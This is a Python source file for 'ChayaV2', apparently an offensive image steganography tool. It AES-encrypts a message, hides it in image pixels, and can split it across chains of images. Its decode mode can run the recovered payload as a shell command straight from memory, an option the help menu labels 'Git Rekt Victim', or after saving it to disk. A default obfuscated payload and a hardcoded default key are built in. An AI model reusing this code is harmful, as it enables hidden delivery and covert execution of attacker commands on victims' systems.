#!/usr/bin/env python3
#
# > ------------------------------------- < #
# >                                       < #
# >               [ ChayaV2 ]             < #
# >                                       < #
# >      Advance Image Steganography      < #
# >                                       < #
# > ------------------------------------- < #
#
# [= Project: https://github.com/haxerzin/ChayaV2
# [= GitHub: https://github.com/haxerzin/
# [= License: AGPLv3
#
#
# Quick Tip: Use Python 3.11 for performance
#

import sys
import os
import urllib.request
import json
import codecs
from copy import deepcopy
from pathlib import Path
from random import shuffle

from core.config import *
from core.colors import *
from core.utils import *
from core.cryptography import *
from core.steganography import *
from core.compression import *
#from core.analysis import Generate_Analysis_Results, Generate_CSV

import tqdm
import asyncio
from prettytable import PrettyTable
from argparse import ArgumentParser
from pprint import pprint

# global args
global argument_enc
global argument_lps
global argument_lsb
global argument_amsin
global argument_amsmm
global argument_amlchi
global argument_amrchi
global argument_exmem
global argument_exdis
global argument_secret_message
global argument_secret_key
global argument_json2csv
global argument_jpg2png

global cipher_data_array
global image_information

# temp list for in-memory random id comparison
temporary_random_id_array = []

# temp array for in-memory decrypted cipher data
temporary_cipher_data = []

# image indexing
global current_image_index
image_index_map = []
image_group = []

# Function > Get object data value from json object
async def read_cipher_data_objects_value_from_file(object_name):
    object_values = []
    try:
        jpath = str(Path.cwd()) + "/appdata/cipher_data.json"
        jpath = convert_to_path(jpath)
        with open(jpath, 'r') as f:
            images_cipher_data = json.loads(f.read())
            for image_data in images_cipher_data:
                object_values.append(image_data[object_name])
        if len(object_values) > 0:
            return object_values
        else:
            return None
    except Exception as e:
        return None


# Function > Architecture Mode Manager
async def arc_setter() -> int:
    architecture_mode = 1
    if argument_amsin:
        architecture_mode = 0
    elif argument_amsmm:
        architecture_mode = 1
    elif argument_amlchi:
        architecture_mode = 2
    elif argument_amrchi:
        architecture_mode = 3
    else:
        architecture_mode = 1
    return architecture_mode


# Function > To read all cipher data
async def read_all_cipher_data() -> None:
    global cipher_data_array

    cipher_data_array.clear()
    try:
        f = open("appdata/cipher_data.json", "r")
        cipher_data_array = json.loads(f.read())
        f.close()
    except Exception as e:
        status(3, 'Cannot read cipher data file!')


# Function > To save image cipher data
async def save_all_cipher_data() -> None:
    global argument_enc

    savepath = "appdata/cipher_data.json"
    with open(savepath, 'w') as f:
        json.dump(cipher_data_array, f, indent=4)
        status(2, f'Cipher Data Saved: {savepath}')
    if argument_enc:
        if argument_json2csv:
            Generate_CSV("cipher_data")


# Function > To save analysis results
async def save_all_analysis_results(type) -> None:
    if type == "enc":
        savepath = "appdata/analysis_results_enc.json"
        with open(savepath, 'w') as f:
            json.dump(image_quality_analysis_data_array, f, indent=4)
            status(0, f'Analysis [Enc] Results Saved: {savepath}')
        image_quality_analysis_data_array.clear()
    elif type == "dec":
        savepath = "appdata/analysis_results_dec.json"
        with open(savepath, 'w') as f:
            json.dump(image_quality_analysis_data_array, f, indent=4)
            status(0, f'Analysis [Dec] Results Saved: {savepath}')
        image_quality_analysis_data_array.clear()


# Function > Payload Combiner
def payload_combiner() -> str:
    payload = ""
    for imginfo in cipher_data_array:
        payload += imginfo['secret_message']
    return payload


# Function > Executor
async def executor(exec_option) -> None:
    payload = payload_combiner()

    # remove 'X' extra padding from payload
    payload = payload.replace('X','')

    match exec_option:
        case 'exmem':
            status(0, f"Execting Payload >> {payload}")
            await run_cmd(payload)
        case 'exdis':
            status(0, f"Saving Payload Before Execution >> payload.txt")
            with open('payload.txt', 'w') as f:
                f.writelines(payload)
            await run_cmd(payload)


# Function > Run Experiments > Enc Mode
async def _ENCRYPTER(raw_image_path, raw_image) -> None:
    global argument_enc
    global argument_lps
    global argument_lsb
    global argument_secret_message
    global argument_secret_key
    global cipher_data_array
    global image_information

    # refresh image information data - with None value
    for x in image_information:
        image_information[x] = None

    status(2, f"Generating Metadata For: {raw_image_path}")

    # generate a random id
    for x in range(100):
        # generate a random id
        random_id = generate_random_id()
        # test for cipher data file not empty
        if not await read_cipher_data_objects_value_from_file("image_id") == None:
            # if random id value is not in our json cipher_data
            if random_id not in await read_cipher_data_objects_value_from_file("image_id"):
                # if random id is not in temporary array list
                if random_id not in temporary_random_id_array:
                    # append random id to image information array
                    image_information['image_id'] = random_id
                    # append random id to temporary array list
                    temporary_random_id_array.append(random_id)
                    # break from the loop
                    break
        else:
            # if random id is not in temporary array list
            if random_id not in temporary_random_id_array:
                # append random id to image information array
                image_information['image_id'] = random_id
                # append random id to temporary array list
                temporary_random_id_array.append(random_id)
                # break from the loop
                break

    temporary_random_id_array.clear()

    image_information['image_index'] = current_image_index
    image_information['raw_image_sha256'] = generate_filesignature_sha256(raw_image_path)
    image_information['steg_image_path'] = f"autoexp/image_steg/{raw_image}"
    image_information['comp_image_path'] = f"autoexp/image_steg_comp/{raw_image[:-4]}.flif"
    image_information['secret_key'] = argument_secret_key
    image_information['secret_message'] = argument_secret_message

    # /* ---- PERFORM ENCRYPTION ---- */
    gcm_result_array = AES_256_GCM_Encrypt(image_information['secret_key'], image_information['secret_message'])
    status(1, "AES-256-GCM Encryption Successful")
    # save to image information dict
    image_information['secret_message'] = gcm_result_array[0]
    image_information['gcm_auth_tag'] = gcm_result_array[1]
    image_information['gcm_cipher_nonce'] = gcm_result_array[2]
    gcm_result_array.clear()

    # /* ---- PERFORM ENCODING ---- */
    if argument_lps:
        lps_results_array = LPS_Encode(raw_image_path, image_information['secret_message'], image_information['steg_image_path'], startingPixel=(0,0))
        status(1, "LSB-LPS Steganography Successful")
        # save to image information dict
        image_information['lps_x_coordinate'] = lps_results_array[0]
        image_information['lps_y_coordinate'] = lps_results_array[1]
        lps_results_array.clear()
        image_information['steg_image_sha256'] = generate_filesignature_sha256(image_information['steg_image_path'])
    elif argument_lsb:
        LSB_Encode(raw_image_path, image_information['secret_message'], image_information['steg_image_path'])
        image_information['lps_x_coordinate'] = 0
        image_information['lps_y_coordinate'] = 0
        image_information['steg_image_sha256'] = generate_filesignature_sha256(image_information['steg_image_path'])
    
    os_name = get_os_name()
    match os_name.lower():
        case "windows":
            pass
        case "linux":
            # /* ---- PERFORM COMPRESSION ---- */
            steg_image_path = f"autoexp/image_steg/{raw_image}"
            comp_image_path = f"autoexp/image_steg_comp/{raw_image[:-4]}.flif"
            image_information['comp_image_path'] = comp_image_path
            flif('e', steg_image_path, comp_image_path)
            image_information['comp_image_sha256'] = generate_filesignature_sha256(image_information['comp_image_path'])

    # /* ---- SAVE IMAGE INFORMATION ---- */
    image_information['message_length'] = utf8len(image_information['secret_message'])
    cipher_data_array.append(deepcopy(image_information))
    #Generate_Analysis_Results(raw_image_path, steg_image_path)


# Function > Run > DECRYPTER
async def _DECRYPTER(raw_image_path) -> None:
    global argument_lps
    global argument_lsb
    global image_information

    os_name = get_os_name()
    match os_name.lower():
        case "windows":
            pass
        case "linux":
            # /* ---- PERFORM DECOMPRESSION ---- */
            flif('d', image_information['steg_image_path'], image_information['comp_image_path'])
    
    # /* ---- PERFORM DECODING ---- */
    if argument_lps:
        decrypted_data = LPS_Decode(image_information['steg_image_path'], int(image_information['lps_x_coordinate']), int(image_information['lps_y_coordinate']))
    elif argument_lsb:
        decrypted_data = LSB_Decode(image_information['steg_image_path'])


    # Base64 Padding Issue Fix
    pad = len(decrypted_data)%4
    decrypted_data +=b"="*pad
    # test padding by decode b64
    #decrypted_data = codecs.decode(decrypted_data.strip(),'base64')
    #print(decrypted_data)

    # /* ---- PERFORM DECRYPTION ---- */
    image_information['secret_message'] = AES_256_GCM_Decrypt(image_information['secret_key'], decrypted_data, image_information['gcm_auth_tag'], image_information['gcm_cipher_nonce'])

    # /* ---- PERFORM ANALYSIS ---- */
    #Generate_Analysis_Results(raw_image_path, image_information['steg_image_path'])


# Function > Generate Image Index Map
def image_index_mapper(maptype: str, raw_images: []) -> []:
    image_index_map = []
    match maptype:
        case 'single':
            image_index_map.append(0)
            return image_index_map
        case 'linear':
            index_count = 0
            while index_count <= len(raw_images) -1:
                image_index_map.append(index_count)
                index_count += 1
            return image_index_map
        case 'random':
            index_count = 0
            while index_count <= len(raw_images) -1:
                image_index_map.append(index_count)
                index_count += 1
            shuffle(image_index_map)
            return image_index_map


# Function > Script 
async def run_manager() -> None:
    global current_image_index
    global argument_secret_message
    global argument_json2csv
    global argument_jpg2png
    global cipher_data_array
    global image_information

    status(2, f"Starting Automatic Operations")

    cipher_data_array.clear()

    payloads = []

     # for conversion from jpg to png
    if argument_jpg2png:
        # raw image directory
        raw_images_dir = "autoexp/image_raw/"
        status(2, f"Getting All Raw Images From Directory")
        raw_images = await get_files_in_dir(raw_images_dir)
        status(2, "Converting JPG to PNG")
        for raw_image in tqdm.tqdm(raw_images):
            raw_image_path = f"{raw_images_dir}{raw_image}"
            await convert_jpg_to_png(raw_image_path)

    # raw image directory
    raw_images_dir = "autoexp/image_raw/"
    status(2, f"Getting All Raw Images From Directory")
    raw_images = await get_files_in_dir(raw_images_dir)

    # if encryption
    if argument_enc:
        status(2, f"Determining architecture mode")
        architecture_mode = await arc_setter()
        match architecture_mode:
            case 0:
                status(0, f"Architecture Mode = Single")
                # encode/decode one image
                image_group.append(raw_images[0])
                image_index_map = image_index_mapper('single', raw_images)
                payloads.append(argument_secret_message)
            case 1:
                status(0, f"Architecture Mode = Linear Same")
                # encode/decode multiple images with same payload
                image_index_map = image_index_mapper('linear', raw_images)
                for x in raw_images:
                    image_group.append(x)
                x_count = 0
                while x_count <= len(image_group) -1:
                    payloads.append(argument_secret_message)
                    x_count +=1
            case 2:
                status(0, f"Architecture Mode = Linear Split")
                # encode/decode split payload in linear image chain
                image_index_map = image_index_mapper('linear', raw_images)
                for x in raw_images:
                    image_group.append(x)
                n = len(image_index_map) -1
                payloads = text_chunker(argument_secret_message, n)
                if len(payloads) < len(image_index_map):
                    payloads.append("X")
            case 3:
                status(0, f"Architecture Mode = Random Split")
                # encode/decode split payload in random image chain
                image_index_map = image_index_mapper('random', raw_images)
                index_count = 0
                while index_count <= len(raw_images) -1:
                    image_group.append(raw_images[image_index_map[index_count]])
                    index_count += 1
                n = len(image_index_map) -1
                payloads = text_chunker(argument_secret_message, n)
                if len(payloads) < len(image_index_map):
                    payloads.append("X")

    # if encryption
    if argument_enc:
        # for each image in the folder of raw images
        x_index = 0
        while x_index <= len(image_index_map) - 1:
            current_image_index = image_index_map[x_index]
            raw_image_path = f"{raw_images_dir}{image_group[x_index]}"
            argument_secret_message = payloads[x_index]
            status(0, current_image_index)
            status(0, image_group[x_index])
            status(0, raw_image_path)
            status(0, payloads[x_index])
            await _ENCRYPTER(raw_image_path, image_group[x_index])
            x_index += 1
        await save_all_cipher_data()
        await save_all_analysis_results('enc')
        cipher_data_array.clear()
        image_information.clear()
    # if decryption
    else:
        image_information.clear()

        await read_all_cipher_data()

        for x in range(len(cipher_data_array)):
            image_information = cipher_data_array[x]
            current_image_index = image_information["image_index"]
            raw_image_path = f"{raw_images_dir}{raw_images[current_image_index]}"
            await _DECRYPTER(raw_image_path)
            temporary_cipher_data.append(deepcopy(image_information))
        cipher_data_array.clear()
        cipher_data_array = temporary_cipher_data
        await save_all_cipher_data()
        await save_all_analysis_results('dec')

        # checking for execution mode
        if argument_exmem:
            await executor('exmem')
        if argument_exdis:
            await executor('exdis')

        cipher_data_array.clear()
        image_information.clear()

        # if json2csv option
        if argument_json2csv == True:
            await Generate_CSV("analysis_results")


# Function > GitHub Script Version
async def github_version() -> int:
    runtime = current_runtime()
    url = f"https://raw.githubusercontent.com/haxerzin/ChayaV2/{runtime}/VERSION.txt"
    try:
        response = urllib.request.urlopen(url)
        for content in response:
            return int(content)
    except Exception as e:
        raise e


# Function > Current Script Version
async def current_version() -> int:
    version_number = 0
    v_path = str(Path.cwd()) + "/VERSION.txt"
    v_path = convert_to_path(v_path)
    with open(v_path) as f:
        version_number = f.readline()
    return int(version_number)


# Function > Compare Current Version
async def version_check() -> int:
    current_v, github_v = await current_version(), await github_version()
    if current_v < github_v:
        status(0, f"  [ Version: {c_red}Outdated")
        return 0
    elif current_v == github_v:
        status(0, f"  [ Version: {c_green}Latest\n")
        return 1
    elif current_v > github_v:
        status(0, f"  [ Version: {c_blue}Ahead\n")
        return 2


# Function > Download Updater
async def download_updater():
    runtime = current_runtime()
    url = f"https://raw.githubusercontent.com/haxerzin/ChayaV2/{runtime}/update.py"
    await download_file(url, "req")


# Function > Run Updater
async def run_updater():
    check_internet = await internet_on()
    match check_internet:
        case True:
            await download_updater()
            status(2, "Updating Your Script. DO NOT Exit!")
            try:
                status(2, "Running: update.py")
                await run_cmd("python update.py")
                exit()
            except Exception as e:
                status(3, f"Unable to start: updater.py\n{e}\nEXITING!\n")
                exit()
        case False:
            status(3, "Cannot Update: You Are Offline")
            exit()


# Function > Chaya Help
async def chaya_help() -> None:
    print('\n')
    htable_parser_main = PrettyTable()
    htable_group_operations = PrettyTable()
    htable_group_steganography = PrettyTable()
    htable_group_archmode = PrettyTable()
    htable_group_execmode = PrettyTable()
    htable_parser_main.field_names = htable_group_operations.field_names = htable_group_steganography.field_names = htable_group_archmode.field_names = htable_group_execmode.field_names = ["Arg Less", "Arg Full", "Description"]

    # arguments for operations
    htable_group_operations.add_row([f"{c_green}-enc", "--encrypt", f"{c_yellow}Perform Encryption{c_white}"])
    htable_group_operations.add_row([f"{c_green}-dec", "--decrypt", f"{c_yellow}Perform Decryption{c_white}"])

    # arguments for steganography
    htable_group_steganography.add_row([f"{c_green}-lps", "--lps", f"{c_yellow}LSB-LPS Steganography {c_blue}(Default){c_white}"])
    htable_group_steganography.add_row([f"{c_green}-lsb", "--lsb", f"{c_yellow}LSB-Only Steganography {c_red}(Not Recommemded){c_white}"])

     # arguments for encoding architecture
    htable_group_archmode.add_row([f"{c_green}-amsin", "--AmSingle", f"{c_yellow}Encode One/Single Image"])
    htable_group_archmode.add_row([f"{c_green}-amsmm", "--AmSameMultiple", f"{c_yellow}Encode Multiple Images With Same Payload {c_blue}(default){c_white}"])
    htable_group_archmode.add_row([f"{c_green}-amlchi", "--AmLinearChain", f"{c_yellow}Split Encode Payload Into Linear Chains of Multiple Images {c_green}(Secure){c_white}"])
    htable_group_archmode.add_row([f"{c_green}-amrchi", "--AmRandomChain", f"{c_yellow}Split Encode Payload Into Random Chains of Multiple Images {c_green}(Secure){c_white}"])

    # arguments for execution
    htable_group_execmode.add_row([f"{c_green}-exmem", "--ExecMemory", f"{c_yellow}Execute payload from Memory without saving on disk {c_green}(Git Rekt Victim){c_white}"])
    htable_group_execmode.add_row([f"{c_green}-exdis", "--ExecDisk", f"{c_yellow}Execute payload after saving to temprary file on disk {c_red}(Git D3tec7ed Attacker){c_white}"])

    # arguments for main parser
    htable_parser_main.add_row([f"{c_green}-m", "--msg", f"{c_yellow}Your Secret Message{c_white}"])
    htable_parser_main.add_row([f"{c_green}-k", "--key", f"{c_yellow}Your Secret Key{c_clean}"])
    htable_parser_main.add_row([f"{c_green}-j2c", "--json2csv", f"{c_yellow}Convert JSON Data To CSV{c_white}"])
    htable_parser_main.add_row([f"{c_green}-jpg2png", "--jpg2png", f"{c_yellow}Raw JPG to PNG Conversion"])
    htable_parser_main.add_row([f"{c_green}-cleardata", "--cleardata", f"{c_yellow}Clear all appdata{c_white}"])
    htable_parser_main.add_row([f"{c_green}-update", "--update", f"{c_yellow}Update Chaya{c_white}"])
    htable_parser_main.add_row([f"{c_green}-h", "--help", f"{c_yellow}Help Menu{c_white}"])

    # print help menu
    print(f" Operational Modes > Mutually Exclusive")
    print(f"{c_white}{htable_group_operations}{c_clean}")
    print("\n Steganography Modes > Mutually Exclusive")
    print(f"{c_white}{htable_group_steganography}{c_clean}")
    print("\n Standard Options")
    print(f"{c_white}{htable_parser_main}{c_clean}")
    print("\n Encoding Architectures > Mutually Exclusive")
    print(f"{c_white}{htable_group_archmode}{c_clean}")
    print("\n Execution Modes > Mutually Exclusive")
    print(f"{c_white}{htable_group_execmode}{c_clean}")


# Function > Argument parser setter
def arg_setter(args) -> None:
    global argument_enc
    global argument_lps
    global argument_lsb
    global argument_amsin
    global argument_amsmm
    global argument_amlchi
    global argument_amrchi
    global argument_exmem
    global argument_exdis
    global argument_secret_message
    global argument_secret_key
    global argument_json2csv
    global argument_jpg2png

    # settings: operational modes
    if args.encrypt:
        argument_enc = True
    elif args.decrypt:
        argument_enc = False
    else:
        argument_enc = True
    # settings: steganography modes
    if args.lps:
        argument_lps = True
        argument_lsb = False
    elif args.lsb:
        argument_lsb = True
        argument_lps = False
    # settings: encoding architectures
    if args.AmSingle:
        argument_amsin = True
    if args.AmSameMultiple:
        argument_amsmm = True
    else:
        argument_amsmm = False
    if args.AmLinearChain:
        argument_amlchi = True
    if args.AmRandomChain:
        argument_amrchi = True
    # settings: execution modes
    if args.ExecMemory:
        argument_exmem = True
    if args.ExecDisk:
        argument_exdis = True
    # settings standard options
    if args.msg:
        argument_secret_message = args.msg
    if args.key:
        argument_secret_key = args.key
        for x in range(0, 32):
            if len(argument_secret_key) < 32:
                argument_secret_key = f"{argument_secret_key}x"
    if args.json2csv:
        argument_json2csv = True
    if args.jpg2png:
        argument_jpg2png = True

    if (argument_secret_key == None or argument_secret_key == ""):
        argument_secret_key = "abcdefghijklmnopqrstuvwxyzabcdef"
        status(2, 'User has not defined any secret key')
        status(2, f'Using default key: {argument_secret_key}')
    if (argument_secret_message == None or argument_secret_message == ""):
        argument_secret_message = "proc./<h77p5://4p7-5734l5-3v3ry7hInG.54d/>./ess|.start.|"
        status(2, 'User has not defined any payload')
        status(2, f'Using default payload: {argument_secret_message}')


# Function > Start Chaya Script
async def chaya_start() -> None:
    clear()
    await banner()
    internet_status = await internet_on()
    if internet_status:
        version_status = await version_check()
        match version_status:
            case 0:
                status(3, f"\nTo Update Please Run: {c_yellow}python chaya.py -update")
    
    # start argument parser
    parser = ArgumentParser(description="ChayaV2 Argument Parser", add_help=False)

    # argument groups
    group_operations = parser.add_mutually_exclusive_group()
    group_steganogprahy = parser.add_mutually_exclusive_group()
    group_architecture = parser.add_mutually_exclusive_group()
    group_execution = parser.add_mutually_exclusive_group()
    group_executor = parser.add_mutually_exclusive_group()

    # argument group operations
    group_operations.add_argument('-enc','--encrypt', action="store_true")
    group_operations.add_argument('-dec','--decrypt', action="store_true")

    # argument group steganography
    group_steganogprahy.add_argument('-lps', '--lps', action="store_true")
    group_steganogprahy.add_argument('-lsb', '--lsb', action="store_true")

    # argument group architecture
    group_architecture.add_argument('-amsin', '--AmSingle', action="store_true")
    group_architecture.add_argument('-amsmm', '--AmSameMultiple', action="store_true")
    group_architecture.add_argument('-amlchi', '--AmLinearChain', action="store_true")
    group_architecture.add_argument('-amrchi', '--AmRandomChain', action="store_true")

    # argument group execution
    group_execution.add_argument('-exmem','--ExecMemory', action="store_true")
    group_execution.add_argument('-exdis','--ExecDisk', action="store_true")

    # general options
    parser.add_argument('-m','--msg', type=str)
    parser.add_argument('-k','--key', type=str)
    parser.add_argument('-j2c','--json2csv', action="store_true")
    parser.add_argument('-jpg2png','--jpg2png', action="store_true")
    parser.add_argument('-cleardata', '--cleardata', action="store_true")
    parser.add_argument("-update", "--update", action="store_true")
    parser.add_argument("-h", "--help", action="store_true")

    args = parser.parse_args()

    # if no args passed
    if not len(sys.argv) > 1:
        exit()

    # special args
    if args.cleardata:
        await clear_appdata()
        exit()
    if args.update:
        await run_updater()
    if args.help:
        await chaya_help()
        exit()

    # assign arg values
    arg_setter(args)

    # Run main module
    await run_manager()


# Initialize Script
if __name__ == "__main__":
    asyncio.run(chaya_start())
